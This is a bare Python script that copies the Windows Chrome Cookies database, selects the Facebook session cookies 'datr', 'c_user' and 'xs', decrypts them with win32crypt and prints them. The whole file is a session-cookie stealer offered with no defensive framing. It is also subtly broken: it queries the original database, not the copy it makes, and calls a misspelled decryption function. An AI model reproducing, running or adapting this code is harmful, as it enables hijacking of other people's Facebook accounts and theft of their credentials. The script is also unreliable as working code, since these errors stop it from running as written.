import os, sqlite3, shutil, win32crypt
#pip install pywin32

db = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
db_copy = db + "2"
shutil.copyfile(db, db_copy)
connection = sqlite3.connect(db)
consulta = connection.cursor()
query = "SELECT name, encrypted_value FROM cookies WHERE host_key='.facebook.com' AND (name='datr' OR name='c_user' OR name='xs')"
consulta.execute(query)
for name, value in consulta.fetchall():
    value = win32crypt.CryptUnprotectedData(value)
    unprotected_value = value[1].decode("ISO-8859-1")
    print(f"[+] {name} => {unprotected_value}\n")

connection.close()
os.remove(db_copy)